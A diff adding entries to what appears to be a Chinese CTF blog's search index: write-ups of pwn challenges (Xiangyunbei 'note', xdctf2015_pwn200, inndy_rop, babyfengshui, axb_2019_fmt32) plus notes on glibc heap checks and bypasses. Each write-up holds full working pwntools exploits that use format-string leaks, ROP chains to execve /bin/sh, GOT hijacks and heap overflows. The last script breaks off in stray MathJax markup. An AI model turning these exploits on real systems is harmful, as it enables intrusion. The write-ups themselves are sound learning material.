@@ -1,6 +1,312 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>2021祥云杯PWN</title>
+    <url>/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/</url>
+    <content><![CDATA[<p>以下是我根据大佬的wp一点点复现的，比赛时，太菜了，都没做出来。下面两个链接是大佬的wp</p>
+<p><a href="https://zhuanlan.zhihu.com/p/402722060">https://zhuanlan.zhihu.com/p/402722060</a></p>
+<p><a href="https://mp.weixin.qq.com/s/_jPCp1U9c6EaGa4S2cx2mQ">https://mp.weixin.qq.com/s/_jPCp1U9c6EaGa4S2cx2mQ</a></p>
+<h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903160536437.png"><span class="image-caption">image-20210903160536437</span></p>
+<p>常规checksec一下，64位，保护全开</p>
+<p>进入IDA看看，程序很简单，就不细说了。主要说下漏洞点</p>
+<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903160656584.png"><span class="image-caption">image-20210903160656584</span></p>
+<p>在修改功能函数里面，存在scanf(buf)，存在格式化字符串漏洞，然后这边的要去计算偏移，一定要去相应版本的Ubuntu下去动态调试，我刚开始是在20.04下调试，偏移不对。然后这边调试技巧：因为程序开pie了，所以我们可以先输入start指令，会断在开头，这时候可以获取当前的pie，才能断点在相应的位置</p>
+<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903161041335.png"><span class="image-caption">image-20210903161041335</span></p>
+<p>可以计算出偏移是6，并且在底下就存在着残留的stdout指针，此时stdout指针的偏移是7，所以第一个buf就是<code>%7$s</code>那么可以修改stdout从而泄露libc地址</p>
+<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903162610572.png"><span class="image-caption">image-20210903162610572</span></p>
+<p>吐出了一大堆数据，接收即可。</p>
+<p>然后去劫持exit_hook中的_dl_rtld_lock_recursive为one_gadget，当调用exit函数时可得到shell</p>
+<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903171325616.png"><span class="image-caption">image-20210903171325616</span></p>
+<p>而要找到这个偏移，要去_rtld_global中寻找</p>
+<p>计算可得偏移为0x5F0F48</p>
+<p>这边我是在本地调试的，我收到的libc的距离libc基址的偏移与wp的不太一样，是为479552，然后就是再次借用格式化字符串漏洞，前面说过了，格式化字符串处在第六个偏移，那么我们填满八个字节，然后把获得的rtld_lock地址跟在后面填入，就变为第七个偏移，之后就能在上面写入one_gadget，最后执行exit(0)getshell</p>
+<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903174509942.png"><span class="image-caption">image-20210903174509942</span></p>
+<p>成功getshell</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>elf = ELF(<span class="hljs-string">&#x27;./note&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process(argv=[elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:libc.path&#125;)<br><br>def <span class="hljs-builtin-name">debug</span>():<br>	gdb.attach(p)<br>def <span class="hljs-builtin-name">add</span>(size, content):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>, str(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;content:&#x27;</span>, content)<br><br><span class="hljs-builtin-name">add</span>(0x20,<span class="hljs-string">&#x27;a&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;say ? &#x27;</span>,<span class="hljs-string">&#x27;%7$s\x00&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;? &#x27;</span>,p64(0xfbad1800) + p64(0) * 3 + <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - 479552<br><span class="hljs-builtin-name">print</span>(<span class="hljs-string">&quot;libc=&gt;&quot;</span>,hex(libc_base))<br><span class="hljs-builtin-name">debug</span>()<br>ogg = libc_base + 0xf1247<br>rtld_lock = libc_base + 0x5F0F48<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;say ? &#x27;</span>,<span class="hljs-string">&#x27;%7$s\x00&#x27;</span>.ljust(8,<span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(rtld_lock))<br>p.sendlineafter(<span class="hljs-string">&#x27;? &#x27;</span>,p64(ogg))<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>祥云杯PWN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>libc版本检查机制</title>
+    <url>/2021/08/30/2021-08-30-libc%E7%89%88%E6%9C%AC%E6%A3%80%E6%9F%A5%E6%9C%BA%E5%88%B6/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇本章是以libc-2.23.so为基础，去对比之后版本的差异问题</p>
+<h2 id="libc-2-23-so"><a href="#libc-2-23-so" class="headerlink" title="libc-2.23.so"></a>libc-2.23.so</h2><h3 id="Tcache"><a href="#Tcache" class="headerlink" title="Tcache"></a>Tcache</h3><p>tcache是在libc-2.27.so引进的一种新机制</p>
+<ul>
+<li><code>tcache_prethread_struct</code> 是整个 tcache 的管理结构，其中有 64 项 entries。每个 entries 管理了若干个大小相同的 chunk，用单向链表 (<code>tcache_entry</code>) 的方式连接释放的 chunk，这一点上和 fastbin 很像</li>
+<li>每个 thread 都会维护一个 <code>tcache_prethread_struct</code></li>
+<li><code>tcache_prethread_struct</code> 中的 <code>counts</code> 记录 <code>entries</code> 中每一条链上 chunk 的数目，每条链上最多可以有 7 个 chunk</li>
+<li>tcache_entry用于链接 chunk 结构体，其中的next指针指向下一个大小相同的 chunk<ul>
+<li>这里与 fastbin 不同的是 fastbin 的 fd 指向 chunk 开头的地址，而 tcache 的 next 指向 user data 的地方，即 chunk header 之后</li>
+</ul>
+</li>
+</ul>
+<p>简单来说：就是类似fastbin一样的东西，每条链上最多可以有 7 个 chunk，free堆块的时候优先放入tcache中，满了才放入fastbin，unsorted bin，malloc的时候优先去tcache找（tcache的范围是 [0x20, 0x400)，超过这个大小的就会放入unsorted bin）</p>
+<p>tcache dup：因为前几个版本的 <code>tcache bin</code>是缺乏校验机制的，即使对<code>tcache bin chunk</code>重复释放，也不会引发任何异常。比<code>fastbin chunk</code>的约束更少，一来不检查size域，二来也不检查是否重复释放</p>
+<p><code>tcache_perthread_struct</code>这个结构体是可以释放的，并且可以将它释放到<code>unsorted bin</code>中去，然后分配这个<code>unsorted bin chunk</code>，可以控制任意地址分配堆内存。</p>
+<p>但是这个机制存在的重复释放，在libc-2.29.so时候往tcache结构体添加了一个<code>key</code>字段来防止double free</p>
+<h2 id="libc-2-29-so"><a href="#libc-2-29-so" class="headerlink" title="libc-2.29.so"></a>libc-2.29.so</h2><ul>
+<li><p>往tcache结构体中加入<code>key</code>字段防止double free</p>
+<ul>
+<li><p>绕过：</p>
+<p>1.free一个chunk</p>
+<p>2.能够修改已经free的chunk的key值</p>
+<p>3.double free</p>
+</li>
+</ul>
+</li>
+<li><p>对于<code>unsortbin</code>的解链添加了验证链完整性的检查，让 <code>unsortbin attack</code>失效</p>
+<ul>
+<li><p>绕过：</p>
+<p>1.largebin中的chunk-&gt;fd_nextsize=0;</p>
+<p>2.largebin中的chunk-&gt;bk_nextsize可控制;</p>
+<p>3.unsortedbin里的chunk大于largebin，并且如果进入largebin，是同一个index。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="Tcache-Stashing-Unlink-Attack"><a href="#Tcache-Stashing-Unlink-Attack" class="headerlink" title="Tcache Stashing Unlink Attack"></a>Tcache Stashing Unlink Attack</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.<code>smallbin</code>中可以控制大小为size块的bk指针</p>
+<p>2.<code>tcache</code>中size块的个数为6</p>
+<p>3.申请堆块是<code>calloc</code></p>
+<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><p>bk指针的fd处被写入一个libc地址</p>
+<h2 id="libc-2-3-so"><a href="#libc-2-3-so" class="headerlink" title="libc-2.3.so"></a>libc-2.3.so</h2>]]></content>
+      <tags>
+        <tag>libc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>buu07</title>
+    <url>/2021/08/12/2021-08-12-buu07/</url>
+    <content><![CDATA[<h2 id="一、xdctf2015-pwn200"><a href="#一、xdctf2015-pwn200" class="headerlink" title="一、xdctf2015_pwn200"></a>一、xdctf2015_pwn200</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210812185855607.png"><span class="image-caption">image-20210812185855607</span></p>
+<p>checksec一下，32位，开了nx</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210812192549644.png"><span class="image-caption">image-20210812192549644</span></p>
+<p>程序很简单，这边有个很明显的栈溢出，并且程序含有泄露函数write，构造基础的rop就行了</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210812192512692.png"><span class="image-caption">image-20210812192512692</span></p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25644</span>)<br><span class="hljs-comment">#p=process(&#x27;./bof&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./bof&#x27;</span>)<br>main=<span class="hljs-number">0x80484d6</span><br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.recvline()<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p32(write_plt)+p32(main)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>p.sendline(payload)<br>write=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-string">&quot;write addr:&quot;</span>+<span class="hljs-built_in">hex</span>(write))<br>libc=LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write)<br>libc_base=write-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p32(system)+p32(main)+p32(binsh)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="二、jarvisoj-level6-x64"><a href="#二、jarvisoj-level6-x64" class="headerlink" title="二、jarvisoj_level6_x64"></a>二、jarvisoj_level6_x64</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210812200521406.png"><span class="image-caption">image-20210812200521406</span></p>
+<p>看附件名字，应该是道堆题，这道堆题没开PIE</p>
+<h2 id="三、inndy-rop"><a href="#三、inndy-rop" class="headerlink" title="三、inndy_rop"></a>三、inndy_rop</h2><p>先checksec一下，32位，只开了nx</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210823202233200.png"><span class="image-caption">image-20210823202233200</span></p>
+<p>进入ida，程序很简单，只有一个gets函数，明显溢出</p>
+<p>然后程序东西很繁杂，这种就是属于静态编译的程序，程序里面包含着程序所需要的函数信息，但是找了一下，没有找到/bin/sh，以及system，那应该就是要构造gadgets了，去使用系统调用号函数获取shell</p>
+<img src="/2021/08/12/2021-08-12-buu07/image-20210823195230792.png" style="zoom:80%;"><span class="image-caption">image-20210823195230792</span>
+
+<p>百度了一下，ROPgadget内置了相关工具，可以直接针对这种题目有现成的exp</p>
+<p><code>ROPgadget --binary rop --ropchain</code></p>
+<img src="/2021/08/12/2021-08-12-buu07/image-20210823195052520.png" style="zoom:80%;"><span class="image-caption">image-20210823195052520</span>
+
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210823201506833.png"><span class="image-caption">image-20210823201506833</span></p>
+<p>这边其实还有种办法，就是使用mprotect函数修改.bss段的执行权限，然后写入shellcode，再执行来getshell</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210823201429425.png"><span class="image-caption">image-20210823201429425</span></p>
+<p>程序里面是有mprotect函数的</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29804</span>)<br>p = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">16</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b8016</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;/bin&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea064</span>) <span class="hljs-comment"># @ .data + 4</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b8016</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;//sh&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080492d3</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080481c9</span>) <span class="hljs-comment"># pop ebx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080de769</span>) <span class="hljs-comment"># pop ecx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080492d3</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806c943</span>) <span class="hljs-comment"># int 0x80</span><br><br>r.sendline(p)<br>r.interactive()<br>r.close()<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="四、babyfengshui-33c3-2016"><a href="#四、babyfengshui-33c3-2016" class="headerlink" title="四、babyfengshui_33c3_2016"></a>四、babyfengshui_33c3_2016</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210823202142271.png"><span class="image-caption">image-20210823202142271</span></p>
+<p>checksec一下，32位，开了NX、Canary</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210823231658268.png"><span class="image-caption">image-20210823231658268</span></p>
+<p>漏洞点在于修改堆块内容里面的检查机制有问题：只要把两个堆块分开，一个在头一个在尾，那就代表着能溢出覆盖两个堆块间的所有堆块。而且这很容易就能办到，只要连续申请几次堆块，把最开始申请的释放了，然后我们申请一个被释放大小的堆块，那这个堆块就出现在了头部，而另一个就是在尾部</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827142300094.png"><span class="image-caption">image-20210827142300094</span></p>
+<p>而打印函数，认真看，是printf函数，%s，那么这是会解析一个地址，然后把这个地址上的内容打印出来，所以我们通过溢出把free的got表地址写上去，那么解析完打印出来的就是free的真实地址，从而获得libc基址</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827143043150.png"><span class="image-caption">image-20210827143043150</span></p>
+<p>同样，这边修改description的函数，也是会把description的地址传入进去修改，那么只需要对着前面已经写入free的got表地址的堆块进行这个操作，就能把system函数写进去，从而劫持got表</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&#x27;node4.buuoj.cn&#x27;, 27980)</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Add</span>(<span class="hljs-params">size, length, text</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;description: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>	p.sendlineafter(<span class="hljs-string">&quot;name: &quot;</span>, <span class="hljs-string">&#x27;qin&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;length: &quot;</span>, <span class="hljs-built_in">str</span>(length))<br>	p.sendlineafter(<span class="hljs-string">&quot;text: &quot;</span>, text)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Del</span>(<span class="hljs-params">index</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Dis</span>(<span class="hljs-params">index</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Upd</span>(<span class="hljs-params">index, length, text</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br>	p.sendlineafter(<span class="hljs-string">&quot;length: &quot;</span>, <span class="hljs-built_in">str</span>(length))<br>	p.sendlineafter(<span class="hljs-string">&quot;text: &quot;</span>, text)<br><br>Add(<span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;qin&#x27;</span>)<br>Add(<span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;qin&#x27;</span>)<br>Add(<span class="hljs-number">0x8</span>, <span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br>Del(<span class="hljs-number">0</span>)<br>Add(<span class="hljs-number">0x100</span>,<span class="hljs-number">0x19c</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x198</span>+p32(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>gdb.attach(p)<br>Dis(<span class="hljs-number">1</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;description: &quot;</span>)<br>free_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;free&#x27;</span>, free_addr)<br>libc_base = free_addr - libc.dump(<span class="hljs-string">&#x27;free&#x27;</span>)<br>sys_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>Upd(<span class="hljs-number">1</span>, <span class="hljs-number">0x4</span>, p32(sys_addr))<br>Del(<span class="hljs-number">2</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="五、axb-2019-fmt32"><a href="#五、axb-2019-fmt32" class="headerlink" title="五、axb_2019_fmt32"></a>五、axb_2019_fmt32</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210824223244646.png"><span class="image-caption">image-20210824223244646</span></p>
+<p>惯例checksec，32位，开了NX</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210824225801805.png"><span class="image-caption">image-20210824225801805</span></p>
+<p>IDA里面很明显的就是给了格式化字符串，题目也暗示了。但是由于程序内很干净，没有什么其他函数，那要getshell，就得先格式化字符串泄露出libc，再借用格式化字符串写到栈上，我想了一下，栈还要再泄露出栈地址，也可以实现（因为有个函数environ就是存了栈地址的），所以这边我转念想到劫持got表就不要这么麻烦，got地址又是直接已知的</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210824225741699.png"><span class="image-caption">image-20210824225741699</span></p>
+<p>然后先计算偏移，这边可以看见，我是输入了4个a的，但是很明显是没有对齐的，所以之后写payload的时候，要先补齐一个字符，所以我们的偏移从第八个开始</p>
+<p>然后这题是有限时的，所以我们利用%x$n的时候，分两次劫持，写成hn（如果hn也超时，那就hhn），这样输入更快捷。不然会timeout</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210825001757873.png"><span class="image-caption">image-20210825001757873</span></p>
+<p>最后就是选择劫持strlen，刚开始是劫持printf的，但是可能是因为在之前有个地方已经调用了printf打印一句话导致出错，然后这边劫持的时候，要在/bin/sh前加上分号，因为我们输入的地方前面其实已经有一串字符串，所以要分隔开，才能识别出/bin/sh</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210825002000682.png"><span class="image-caption">image-20210825002000682</span></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27607</span>)<br><span class="hljs-comment">#p = process(&#x27;./axb_2019_fmt32&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&quot;./axb_2019_fmt32&quot;</span>)<br>printf_got = elf.got[<span class="hljs-string">&quot;printf&quot;</span>]<br>strlen_got = elf.got[<span class="hljs-string">&quot;strlen&quot;</span>]<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.recvuntil(<span class="hljs-string">&quot;tell me:&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> + p32(printf_got) + <span class="hljs-string">&quot;xxxx&quot;</span> <span class="hljs-string">&quot;%8$s&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&quot;xxxx&quot;</span>)<br>printf = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;read--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(printf))<br>sys = printf - <span class="hljs-number">0xe6e0</span><br>sys_high = (sys &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFF</span><br>sys_low =  (sys) &amp; <span class="hljs-number">0xFFFF</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;sys--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(sys))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;low--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(sys_low))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;high--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(sys_high))<br>p.recvuntil(<span class="hljs-string">&quot;tell me:&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> + p32(strlen_got) + p32(strlen_got+<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(sys_low - <span class="hljs-number">18</span>) + <span class="hljs-string">&quot;c%8<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="7.679ex" height="2.676ex" style="vertical-align: -0.505ex;" viewbox="0 -934.9 3306.4 1152.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
+<title id="MathJax-SVG-1-Title">hn" + '%' +str(sys_high - sys_low) +"c%9</title>
+<defs aria-hidden="true">
